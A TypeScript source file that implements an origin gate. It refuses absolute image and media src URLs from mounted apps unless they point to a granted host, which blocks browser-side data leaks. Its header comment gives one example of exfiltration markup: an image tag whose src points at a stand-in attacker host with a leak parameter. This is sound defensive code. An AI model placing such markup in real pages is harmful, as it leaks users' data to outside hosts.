//
//  src-gate.ts — the SRC-ATTRIBUTE ORIGIN GATE (studio-apps.md §8).
//
//  The fetch funnel gates `fetch()` and `<api>`, but a media URL is fetched by the
//  BROWSER: `<image src="https://evil.tld/x?leak=…"/>` in a mounted app's markup would
//  exfiltrate through an image request with zero granted hosts. A shadow root has no CSP
//  boundary of its own, so the renderer refuses the URL BEFORE it enters the DOM — the
//  only sound enforcement point that exists.
//
//  Ownership is derived two ways, both from facts rather than threading:
//    1. the AMBIENT owner — a scoping host (the AppMount facet) brackets its synchronous
//       mount pass with enter()/exit(), which covers first-paint bindings that run while
//       an element is still detached;
//    2. the SHADOW WALK — a later reactive update finds the element attached, and the
//       app boundary IS the shadow root (its host carries `data-dsx-app="<scheme>"`).
//
//  Zero policies registered = zero cost and zero behavior change: every page that mounts
//  no app skips the whole file at one Map.size check.
//

const policies = new Map<string, (url: string) => boolean>();
let ambient: string | null = null;

export const SrcGate = {
  /** register an app's src policy for the life of its mount; returns the unregister */
  register(owner: string, policy: (url: string) => boolean): () => void {
    policies.set(owner, policy);
    return () => { policies.delete(owner); };
  },
  /** bracket a synchronous scoped mount pass; returns the exit (restores the outer owner) */
  enter(owner: string): () => void {
    const prev = ambient;
    ambient = owner;
    return () => { ambient = prev; };
  },
};

/** Admit or refuse one src-class URL for the element it is about to land on. Returns the
 *  URL unchanged for unscoped surfaces, package-relative paths and non-http(s) schemes;
 *  returns "" for a refused absolute URL (every call site already treats "" as no-load). */
export function admitSrc(el: Element | null, url: string): string {
  //  A SELF-CONTAINED EMBED CANNOT HOST AN APP MOUNT — no AppMount facet, no scoping host,
  //  no shadow host carrying `data-dsx-app` — so there is nothing for this gate to gate and
  //  a widget must not carry it. The define folds the body (and the policy map with it),
  //  exactly as the other optional features shed their machinery. Absent the define, the
  //  gate is fully present: an app surface is the only thing that registers a policy, and
  //  zero policies already means zero behaviour change.
  if ((globalThis as typeof globalThis & { __DSX_OPTIONAL_APPSCOPE__?: boolean })
    .__DSX_OPTIONAL_APPSCOPE__ === false) return url;
  if (policies.size === 0) return url;
  if (!/^https?:\/\//i.test(url)) return url;
  let owner = ambient;
  if (owner === null && el !== null) {
    const root = el.getRootNode();
    if (typeof ShadowRoot !== "undefined" && root instanceof ShadowRoot) {
      owner = (root.host as HTMLElement).getAttribute("data-dsx-app");
    }
  }
  if (owner === null) return url;
  const policy = policies.get(owner);
  if (policy === undefined || policy(url)) return url;
  console.warn(`[dsx apps] app "${owner}": refused src origin ${url} — not a granted host`);
  return "";
}
